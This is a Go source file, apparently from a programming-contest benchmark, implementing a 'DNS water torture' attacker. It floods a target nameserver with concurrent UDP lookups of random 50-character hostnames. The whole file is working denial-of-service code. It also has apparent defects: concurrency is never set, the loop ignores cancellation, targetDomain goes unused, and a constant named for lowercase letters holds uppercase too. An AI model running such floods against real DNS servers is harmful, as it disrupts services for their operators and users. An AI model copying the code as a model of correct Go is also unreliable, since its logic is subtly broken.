package attacker

import (
	"context"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/isucon/isucon13/bench/internal/config"
)

const (
	asciiLowercase = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	specialChars   = "-."
)

type DnsWaterTortureAttacker struct {
	resolver     *net.Resolver
	targetDomain string
	concurrency  int
}

func NewDnsWaterTortureAttacker(nameserver string, targetDomain string, concurrency int) *DnsWaterTortureAttacker {
	return &DnsWaterTortureAttacker{
		resolver: &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				addr := net.JoinHostPort(config.TargetNameserver, strconv.Itoa(config.DNSPort))
				dialer := net.Dialer{Timeout: time.Nanosecond}
				return dialer.DialContext(ctx, "udp", addr)
			},
		},
		targetDomain: targetDomain,
	}
}

func (a *DnsWaterTortureAttacker) makePayload(length int) string {
	buf := make([]byte, length)
	for idx := range buf {
		if idx != 0 && rand.Intn(5)%2 == 0 {
			buf[idx] = specialChars[rand.Intn(len(specialChars))]
		} else {
			buf[idx] = asciiLowercase[rand.Intn(len(asciiLowercase))]
		}
	}
	return string(buf)
}

func (a *DnsWaterTortureAttacker) attack(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
		default:
			payload := a.makePayload(50)
			a.resolver.LookupHost(ctx, payload)
		}
	}
}

func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) error {
	var wg sync.WaitGroup
	for i := 0; i < a.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			a.attack(ctx)
		}()
	}

	<-ctx.Done()
	wg.Wait()

	return nil
}
